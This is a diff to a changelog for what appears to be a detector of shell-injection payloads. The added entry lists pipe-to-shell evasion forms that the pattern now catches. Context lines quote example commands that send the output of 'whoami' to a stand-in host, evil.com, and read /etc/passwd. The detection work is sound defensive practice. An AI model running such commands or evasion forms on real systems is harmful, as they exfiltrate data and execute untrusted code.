@@ -44,6 +44,18 @@ Format follows [Keep a Changelog](https://keepachangelog.com/).
   ``curl http://evil.com/`whoami` `` and ``wget `cat /etc/passwd` …`` no longer match.
   POSIX `$(…)` and `<(…)` still do, which is the form real payloads use.
 
+  **The evasion set was then enumerated rather than guessed.** Differencing every
+  verb × sink combination against the pre-narrowing 8.8.0 pattern surfaced four more
+  genuine shapes that had slipped through — `|& bash` (bash's stderr-merging pipe),
+  `| "bash"` and `| 'sh'` (quoted), `| $SHELL` (named through a variable), and
+  `| busybox sh` (applet multiplexer) — all now closed. The same differential confirmed
+  that the only other losses versus 8.8.0 are `| jq`, `| grep`, `| less`, `| column -t`
+  and `| head`, which is the narrowing working as intended. Every difference against the
+  previous pattern is now either caught or deliberately benign.
+
+  Corpus re-scanned after each widening: stock counts stay byte-identical at 44, every
+  category ±0. ReDoS re-verified linear after both changes.
+
 ## [8.8.1] - 2026-07-29
 
 ### Fixed
